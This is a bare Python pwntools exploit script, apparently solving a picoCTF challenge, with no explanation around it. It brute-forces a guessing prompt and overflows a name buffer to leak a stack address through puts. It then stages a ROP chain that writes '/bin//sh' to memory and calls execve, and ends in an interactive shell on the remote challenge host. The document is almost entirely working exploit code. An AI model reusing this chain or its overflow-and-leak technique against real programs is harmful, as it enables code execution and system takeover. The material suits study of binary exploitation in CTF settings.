from pwn import *
from struct import pack

e = ELF("./vuln")

# Padding goes here
p = ''

p += pack('<Q', 0x0000000000410ca3) # pop rsi ; ret
p += pack('<Q', 0x00000000006ba0e0) # @ .data
p += pack('<Q', 0x00000000004163f4) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000047ff91) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000410ca3) # pop rsi ; ret
p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
p += pack('<Q', 0x0000000000445950) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047ff91) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400696) # pop rdi ; ret
p += pack('<Q', 0x00000000006ba0e0) # @ .data
p += pack('<Q', 0x0000000000410ca3) # pop rsi ; ret
p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
p += pack('<Q', 0x000000000044a6b5) # pop rdx ; ret
p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
p += pack('<Q', 0x0000000000445950) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret #####
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret
p += pack('<Q', 0x000000000040137c) # syscall

pay = p

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("jupiter.challenges.picoctf.org", 50583)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})


for i in range(1000):
  p.sendlineafter("guess?", "1")
  p.recvline()

  if p.recvline().strip() != "Nope!":
    break

prdi =  0x0042396b 
prsi = 0x0044b8cd     
prdx = 0x0044a6b5   
p.sendlineafter("Name?", "A" * 0x78 + p64(prdi) + p64(e.symbols["__environ"]) + p64(e.symbols["puts"]) + p64(e.symbols["win"]))

p.recvline()
p.recvline()

leak = u64(p.recvline(keepends=False).ljust(8, "\x00"))
print(hex(leak))

debug()
p.sendlineafter("Name?", "A" * 0x78 + p64(prdi) + p64(0) + p64(prsi) + p64(leak - 0x100) + p64(0) + p64(prdx) + p64(0x1000) + p64(e.symbols["read"]))

ui.pause()

p.sendline(pay)

p.interactive()
